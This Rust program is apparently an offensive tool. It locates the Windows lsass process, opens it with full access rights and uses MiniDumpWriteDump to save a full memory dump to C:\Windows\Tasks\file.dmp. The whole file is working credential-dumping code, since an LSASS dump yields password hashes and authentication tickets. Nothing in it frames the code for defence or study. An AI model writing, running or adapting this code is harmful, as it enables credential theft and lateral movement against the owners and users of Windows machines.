use std::ptr;
use sysinfo::{System, ProcessExt, SystemExt, PidExt};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::Storage::FileSystem::{CreateFileW, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_MODE, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
use windows::Win32::System::Diagnostics::Debug::{MiniDumpWriteDump, MiniDumpWithFullMemory};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS};
use windows::Win32::Foundation::{HANDLE, CloseHandle, GetLastError};
use windows::core::HSTRING;
use windows::w;

fn get_pid() -> u32 {
    let mut sys: System = System::new_all();
    sys.refresh_all();

    let mut pid: u32 = 0;
    for process in sys.processes_by_name("lsass") {
        pid = process.pid().as_u32();
    }
    return pid;
}

fn main() {
    println!("[+] Searching for process...");
    let pid: u32 = get_pid(); 
    println!("[+] Found pid {pid}");

    if pid == 0 {
        panic!("[!] Failed to find process!");
    }

    unsafe {
        println!("[+] Opening handle to process...");
        let h_proc: HANDLE = OpenProcess(PROCESS_ACCESS_RIGHTS(2035711), false, pid).expect("Error opening handle to process");

        let f_name: &HSTRING = w!("C:\\Windows\\Tasks\\file.dmp");
        let sa: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES::default();
        println!("[+] Creating file...");
        let h_file: HANDLE = CreateFileW(
            f_name,
            FILE_GENERIC_READ | FILE_GENERIC_WRITE,
            FILE_SHARE_MODE(0),
            &sa,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(0)
        ).unwrap();

        println!("[+] Creating dump...");
        if !MiniDumpWriteDump(
            h_proc,
            pid,
            h_file,
            MiniDumpWithFullMemory,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        ).as_bool() {
            let e = GetLastError();
            panic!("Error creating dump! {:?}", e);
        }
        CloseHandle(h_file);
        println!("[+] Dump file saved to {}", f_name.to_string());
    }
}
